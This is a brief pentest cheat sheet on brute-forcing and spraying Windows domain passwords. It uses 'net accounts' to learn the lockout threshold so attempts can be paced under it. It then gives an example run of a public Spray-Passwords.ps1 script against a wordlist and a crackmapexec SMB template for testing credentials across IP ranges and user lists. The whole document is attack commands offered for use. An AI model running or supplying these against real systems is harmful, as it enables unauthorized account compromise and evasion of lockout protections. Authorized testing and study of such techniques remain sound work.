# Brute-Forcing Passwords

## PowerShell scripts

What's the lockout threshhold (attempts)? When does this lockout expires (Lockout observation)? Then we can try (X Attempts * Lockout Observations) passwords every day.

```bash
net accounts
```

[This script](https://github.com/ZilentJack/Spray-Passwords/blob/master/Spray-Passwords.ps1) can brute-force password. Example:

```bash
.\Spray-Passwords.ps1 -File .\$WORDLIST -Verbose
```

## CrackMapExec

```bash
crackmapexec smb $IPADDRESS -u $USERNAME -p $PASSWORD -d $DOMAINNAME
#IPAddress could be a range.
#Username could be a file
#Password could be a file
#Domain can be removed
```
